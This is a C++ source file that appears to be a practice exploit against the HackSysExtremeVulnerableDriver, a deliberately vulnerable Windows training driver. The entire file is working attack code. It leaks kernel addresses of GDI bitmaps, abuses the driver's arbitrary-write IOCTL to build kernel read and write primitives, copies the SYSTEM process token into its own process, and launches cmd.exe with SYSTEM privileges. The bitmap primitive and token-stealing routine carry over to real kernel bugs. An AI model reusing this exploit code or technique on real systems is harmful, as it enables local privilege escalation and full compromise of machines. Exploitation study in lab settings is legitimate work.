#include <windows.h>
#include <stdio.h>
#include <Psapi.h>
#include <profileapi.h>
DWORD64 num{};
typedef struct _USER_HANDLE_ENTRY {
	void* pKernel;
	union
	{
		PVOID pi;
		PVOID pti;
		PVOID ppi;
	};
	BYTE type;
	BYTE flags;
	WORD generation;
} USER_HANDLE_ENTRY, * PUSER_HANDLE_ENTRY;
typedef struct _SERVERINFO {
	DWORD dwSRVIFlags;
	DWORD cHandleEntries;
	WORD wSRVIFlags;
	WORD wRIPPID;
	WORD wRIPError;
} SERVERINFO, * PSERVERINFO;
PVOID hManageraddr{};
PVOID addra{};
typedef struct _SHAREDINFO {
	PSERVERINFO psi;
	PUSER_HANDLE_ENTRY aheList;
	ULONG HeEntrySize;
	ULONG_PTR pDispInfo;
	ULONG_PTR ulSharedDelts;
	ULONG_PTR awmControl;
	ULONG_PTR DefWindowMsgs;
	ULONG_PTR DefWindowSpecMsgs;
} SHAREDINFO, * PSHAREDINFO;
LONG ReadMemory(HBITMAP hManager, HBITMAP hWorker, PVOID src, PVOID dest, DWORD len) {
	if (SetBitmapBits(hManager, sizeof(PVOID), &src) == 0) {
		printf("[-] Unable To Set Source Address: 0x%p\n", src);
		return FALSE;
	}
	return GetBitmapBits(hWorker, len, dest) ? TRUE : FALSE;
}
LONG WriteMemory(HBITMAP hManager, HBITMAP hWorker, PVOID src, PVOID dest, DWORD len) {
	if (SetBitmapBits(hManager, len, &src) == 0) {
		printf("[-] Unable To Set Source Address: 0x%p\n", src);
		return FALSE;
	}
	return SetBitmapBits(hWorker, len, &dest) ? TRUE : FALSE;
}
HBITMAP Getaddr()
{
	LPACCEL lpAccel = (LPACCEL)LocalAlloc(LPTR, sizeof(ACCEL) * 700);
	SHAREDINFO* gSharedInfo = (SHAREDINFO*)GetProcAddress(GetModuleHandleA("user32.dll"), "gSharedInfo");
	while (true)
	{
		HACCEL atHandle = CreateAcceleratorTableA(lpAccel, 700);
		USER_HANDLE_ENTRY* gHandleTable = gSharedInfo->aheList;
		DWORD index = LOWORD(atHandle);
		PUSER_HANDLE_ENTRY pKerneladdr = &gHandleTable[index];
		addra = pKerneladdr->pKernel;
		DestroyAcceleratorTable(atHandle);
		atHandle = CreateAcceleratorTableA(lpAccel, 700);
		index = LOWORD(atHandle);
		pKerneladdr = &gHandleTable[index];
		PVOID addrb = pKerneladdr->pKernel;
		if (addrb == addra)
		{
			if (!num)
			{
				hManageraddr = addra;
				printf("hManager KernelAddress at %llX\n", addra);
			}
			else {
				printf("hWorker KernelAddress at %llX\n", addra);
			}
			num++;
			DestroyAcceleratorTable(atHandle);
			return  CreateBitmap(0x701, 2, 1, 8, 0);
		}
	}
}
int main()
{
	HBITMAP hManager = Getaddr();
	printf("hManager handle at %llX\n", hManager);
	HBITMAP hWorker = Getaddr();
	printf("hWorker handle at %llX\n", hWorker);

	HANDLE hDriver = CreateFileA("\\\\.\\HackSysExtremeVulnerableDriver", GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL); if (hDriver == INVALID_HANDLE_VALUE) { printf("[!] Unable to get a handle on the device\n"); return(-1); }
	if (hDriver == INVALID_HANDLE_VALUE) {
		printf("[!] Unable to get a handle on the device\n");
		getchar();
		return(-1);
	}
	LPDWORD dwBytesOut{};
	DWORD64 buf[2];
	buf[1] = ((ULONG64)hManageraddr + 0x50);
	DWORD64 temp= ((ULONG64)addra + 0x50);
	buf[0] = (DWORD64)&temp;
	//修改结构体指针
	DeviceIoControl(hDriver, 0x22200b, buf, 0x10, 0, 0, dwBytesOut, NULL);
	LPVOID lpImageBase[1024];
	DWORD lpcbNeeded;
	TCHAR lpfileName[1024];
	PVOID64 UserBase;
	HMODULE nbase;
	ULONG64 address;
	ULONG64 PsInitialSystemProcess;
	//遍历模块
	EnumDeviceDrivers(lpImageBase, sizeof(lpImageBase), &lpcbNeeded);
	//获取第一个模块地址
	GetDeviceDriverBaseName(lpImageBase[0], lpfileName, 48);
	UserBase = lpImageBase[0];
	nbase = LoadLibrary(L"ntoskrnl.exe");
	printf("UserBase=%llX\n", UserBase);
	address = (ULONG64)GetProcAddress(nbase, "PsInitialSystemProcess");
	//PsInitialSystemProcess 是一个指向system EPROCESS的指针
	PsInitialSystemProcess = ((ULONG64)address - (ULONG64)nbase + (ULONG64)UserBase);
	printf("PsInitialSystemProcess=%llX\n", PsInitialSystemProcess);

	LIST_ENTRY ActiveProcessLinks{};
	DWORD64 currentProcess;//当前进程eporcess
	ULONG64 UniqueProcessId;
	ULONG64 SystemProcess{};

	ReadMemory(hManager, hWorker, (PVOID)PsInitialSystemProcess,
		&SystemProcess, sizeof(LPVOID));
	printf("SystemEProcess=%llX\n", SystemProcess);
	DWORD dwCurrentPID;
	//+0x2f0 ActiveProcessLinks : _LIST_ENTRY
	ReadMemory(hManager, hWorker, (PVOID)(SystemProcess + 0x2f0), &ActiveProcessLinks, sizeof(LIST_ENTRY));
	do
	{
		currentProcess = (DWORD64)((PUCHAR)ActiveProcessLinks.Flink - 0x2f0);
		ReadMemory(hManager, hWorker, (PVOID)(currentProcess + 0x2e8), &UniqueProcessId, sizeof(LPVOID));
		dwCurrentPID = LOWORD(UniqueProcessId);
		ReadMemory(hManager, hWorker, (PVOID)(currentProcess + 0x2f0), &ActiveProcessLinks, sizeof(LIST_ENTRY));
	} while (dwCurrentPID != GetCurrentProcessId());
	ULONG64 systemtoken{};
	//+0x358 Token            : _EX_FAST_REF
	printf("eProcessToken=%llX\n", currentProcess + 0x358);
	ReadMemory(hManager, hWorker, (PVOID)(SystemProcess + 0x358),
		&systemtoken, sizeof(LPVOID));
	printf("systemtoken=%llX\n", systemtoken);
	WriteMemory(hManager, hWorker, (PVOID)(currentProcess + 0x358),
		(PVOID)systemtoken, sizeof(LPVOID));

	STARTUPINFO si = { sizeof(si) };
	PROCESS_INFORMATION pi = { 0 };
	si.dwFlags = STARTF_USESHOWWINDOW;
	si.wShowWindow = SW_SHOW;
	WCHAR wzFilePath[MAX_PATH] = { L"cmd.exe" };
	BOOL bReturn = CreateProcessW(NULL, wzFilePath, NULL, NULL, FALSE, CREATE_NEW_CONSOLE, NULL, NULL, (LPSTARTUPINFOW)&si, &pi);
	getchar();
	return 0;
}

